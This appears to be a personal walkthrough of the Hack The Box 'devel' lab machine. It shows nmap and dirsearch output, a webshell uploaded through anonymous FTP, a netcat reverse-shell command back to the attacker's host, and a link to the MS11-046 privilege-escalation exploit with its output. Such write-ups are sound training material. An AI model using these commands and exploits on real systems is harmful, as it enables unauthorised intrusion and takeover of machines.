nmap
```
┌──(kali㉿kali)-[~/HTB/devel]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.99.217  
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 20:23 EST
Nmap scan report for 10.129.99.217
Host is up (0.045s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose|phone
Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 or Windows 8.1 (88%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (88%), Microsoft Windows 7 (88%), Microsoft Windows 7 Professional or Windows 8 (88%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   44.85 ms 10.10.14.1
2   44.94 ms 10.129.99.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.81 seconds
```

dirsearch
```
┌──(kali㉿kali)-[~/HTB/devel]
└─$ dirsearch -u http://10.129.99.217/   
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/devel/reports/http_10.129.99.217/__25-01-05_20-23-08.txt

Target: http://10.129.99.217/

[20:23:08] Starting: 
[20:23:10] 403 -  312B  - /%2e%2e//google.com
[20:23:10] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[20:23:10] 404 -    1KB - /.ashx                                            
[20:23:11] 404 -    1KB - /.asmx                                            
[20:23:27] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[20:23:57] 403 -    1KB - /aspnet_client/                                   
[20:23:57] 301 -  158B  - /aspnet_client  ->  http://10.129.99.217/aspnet_client/
[20:24:09] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[20:25:32] 404 -    1KB - /service.asmx                                     
[20:25:51] 403 -    2KB - /Trace.axd                                        
[20:25:52] 404 -    1KB - /umbraco/webservices/codeEditorSave.asmx          
[20:26:07] 500 -    3KB - /WebResource.axd?d=LER8t9aS                       
                                                                             
Task Completed
```

![Pasted image 20250106092941](<0. Attachments/Pasted image 20250106092941.png>)

we know it needs asp.net files so we can put a webshell
![Pasted image 20250106094526](<0. Attachments/Pasted image 20250106094526.png>)

![Pasted image 20250106094603](<0. Attachments/Pasted image 20250106094603.png>)

![Pasted image 20250106094625](<0. Attachments/Pasted image 20250106094625.png>)

![Pasted image 20250106095439](<0. Attachments/Pasted image 20250106095439.png>)

via the webshell
```
\\10.10.14.2\kali\nc.exe -e cmd.exe 10.10.14.2 443
```

![Pasted image 20250106100319](<0. Attachments/Pasted image 20250106100319.png>)

https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe

![Pasted image 20250106102309](<0. Attachments/Pasted image 20250106102309.png>)


to find .net frameworks
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

c:\Windows\Microsoft.NET\Framework>dir /A:D
```

when i put the exploit i didnt run anything but after exiting
```
c:\Users\Administrator\Desktop>exit
exit
[*] MS11-046 (CVE-2011-1249) x86 exploit
   [*] by Tomislav Paskalev
[*] Identifying OS
   [+] 32-bit
   [+] Windows 7
[*] Locating required OS components
   [+] ntkrnlpa.exe
      [*] Address:      0x82812000
      [*] Offset:       0x00830000
      [+] HalDispatchTable
         [*] Offset:    0x009593b8
   [+] NtQueryIntervalProfile
      [*] Address:      0x775d5510
   [+] ZwDeviceIoControlFile
      [*] Address:      0x775d4ca0
[*] Setting up exploitation prerequisite
   [*] Initialising Winsock DLL
      [+] Done
      [*] Creating socket
         [+] Done
         [*] Connecting to closed port
            [+] Done
[*] Creating token stealing shellcode
   [*] Shellcode assembled
   [*] Allocating memory
      [+] Address:      0x02070000
      [*] Shellcode copied
[*] Exploiting vulnerability
   [*] Sending AFD socket connect request
      [+] Done
      [*] Elevating privileges to SYSTEM
         [+] Done
         [*] Spawning shell

[*] Exiting SYSTEM shell
```